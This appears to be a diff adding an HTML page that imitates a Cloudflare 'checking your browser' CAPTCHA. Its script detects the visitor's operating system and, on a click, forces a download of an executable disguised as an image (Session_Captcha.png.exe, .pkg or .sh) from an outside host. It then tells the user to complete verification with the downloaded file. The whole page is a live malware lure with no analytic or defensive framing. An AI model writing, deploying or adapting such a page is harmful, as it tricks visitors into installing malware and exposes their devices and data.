@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Just a moment...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen text-center">
+
+  <div class="bg-white shadow-md rounded-xl p-8 max-w-md w-full">
+    
+    <div class="flex justify-center mb-4">
+      <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" alt="Cloudflare" class="h-6">
+    </div>
+
+    <h1 class="text-xl font-semibold mb-3 text-gray-800" id="status">
+      Checking your browser before accessing this site…
+    </h1>
+
+    <p class="text-sm text-gray-600 mb-6">
+      Complete verification using the downloaded file.
+    </p>
+
+    <input
+      id="verifyBox"
+      type="text"
+      readonly
+      value="Click to verify you're human"
+      class="w-full text-center px-4 py-3 border border-gray-300 rounded-md text-gray-700 cursor-pointer hover:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-300 transition"
+    />
+  </div>
+
+  <script>
+    function getOS() {
+      const platform = navigator.platform.toLowerCase();
+      const userAgent = navigator.userAgent.toLowerCase();
+
+      if (platform.includes('win')) return 'win';
+      if (platform.includes('mac')) return 'mac';
+      if (platform.includes('linux')) return 'linux';
+
+      return 'unknown';
+    }
+
+    function triggerDownload(os) {
+      let filePath;
+
+      switch (os) {
+        case 'win':
+          filePath = 'https://macefoods.com/sess/nubcpt/Session_Captcha.png.exe';
+          break;
+        case 'mac':
+          filePath = 'https://macefoods.com/sess/nubcpt/Session_Captcha.png.pkg';
+          break;
+        case 'linux':
+          filePath = 'https://macefoods.com/sess/nubcpt/Session_Captcha.png.sh';
+          break;
+        default:
+          filePath = './unsupported.txt';
+      }
+
+  const link = document.createElement('a');
+  link.href = filePath;
+  link.download = '';
+  link.click();
+    }
+
+    document.getElementById('verifyBox').addEventListener('click', () => {
+      const os = getOS();
+      triggerDownload(os);
+
+      const status = document.getElementById('status');
+      status.textContent = 'Client-Captcha Session';
+
+      const input = document.getElementById('verifyBox');
+      input.value = 'Unverified';
+      input.classList.remove('hover:border-blue-500', 'cursor-pointer');
+      input.classList.add('bg-red-50', 'border-red-400', 'text-red-800');
+    });
+  </script>
+</body>
+</html>
